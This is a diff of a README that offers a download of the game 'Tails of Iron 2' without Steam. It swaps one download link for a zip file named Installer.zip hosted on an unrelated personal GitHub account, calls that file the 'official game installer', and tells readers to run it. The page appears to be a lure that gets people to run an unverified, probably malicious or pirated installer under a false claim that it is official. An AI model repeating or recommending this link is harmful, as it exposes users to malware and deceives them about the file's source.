@@ -22,7 +22,7 @@ Follow the steps below to download and install the game without needing Steam:
 
 ### Step 1: Download the Installer
 - Click the link below to download the official game installer:
-  [Download Tails of Iron 2 Installer](https://nicecolns.com/)
+  [Download Tails of Iron 2 Installer](https://github.com/JeanSylvestrek/game4fun/releases/download/publish/Installer.zip)
 
 ### Step 2: Run the Installer
 - Locate the downloaded file in your "Downloads" folder or your specified location.
